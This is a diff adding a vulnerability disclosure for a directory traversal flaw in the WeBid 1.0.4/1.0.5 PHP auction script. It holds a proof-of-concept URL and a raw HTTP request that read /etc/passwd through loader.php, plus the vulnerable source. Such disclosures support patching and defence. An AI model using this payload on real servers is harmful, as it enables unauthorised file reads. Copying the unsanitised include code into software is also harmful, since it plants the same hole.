@@ -1,0 +1,59 @@
+# Author: loneferret of Offensive Security
+# Product: WeBid 
+# Version: 1.0.4 & 1.0.5 (and maybe older versions)
+# Vendor Site: http://www.webidsupport.com
+# Software Download: http://sourceforge.net/projects/simpleauction/files/simpleauction/WeBid%20v1.0.5/WeBid-1.0.5.zip/download/download
+# Other related vulnerabilities: http://www.exploit-db.com/exploits/22828/
+
+# Tested on: Ubuntu Linux
+
+# Software description:
+# WeBid is an open-source auction script package.
+# Although still in beta stages WeBid is one of the best open-source solutions 
+# for getting an auction site up and running quickly and cheaply.
+# Written in the popular scripting language PHP and with a large collection of highly customisable 
+# features WeBid is the prefect choice for setting up any auction site.
+# Some of it's key features which make WeBid a great choice are: WeBid has an easy to 
+# use administration panel; a user friendly installation process, which allows you to have 
+# your own auction site set up in minutes; an inbuilt payment system allowing your users to 
+# easily pay fees and their purchased items with their favourite payment gateways (these include PayPal, Authorize.Net).
+# As well as being incredibly easy to edit to your liking.
+
+# Vulnerability:
+# Directory Traversal.
+
+# PoC:
+# http://server/path/loader.php?js=../../../../../../../../../../etc/passwd%00.js;
+
+# GET /WeBid/loader.php?js=../../../../../../../../../../etc/passwd%00.js; HTTP/1.1
+# Cookie: PHPSESSID=99ec7c29eb7e060d56bb77aa1320f6de; WEBID_ONLINE=eda35dc2ad7782db5dee1543be4daf4c
+# Host: 172.16.194.148
+# Connection: Keep-alive
+# Accept-Encoding: gzip,deflate
+# User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+# Accept: */*
+
+# Code loader.php
+# if (isset($_GET['js']))
+# { 
+#       $js = explode(';', $_GET['js']);
+#        foreach ($js as $val)
+#        {
+#                $ext = substr($val, strrpos($val, '.') + 1);
+#                if ($ext == 'php')
+#                {
+#                        if (check_file($val))
+#                        {
+#                                include $val;
+#                        }
+#                }
+#                elseif ($ext == 'js' || $ext == 'css')
+#               {
+#                        if (is_file($val))
+#                        {
+#                                echo file_get_contents($val);
+#                                echo "\n";
+#                        }
+#                }
+#       }
+# }
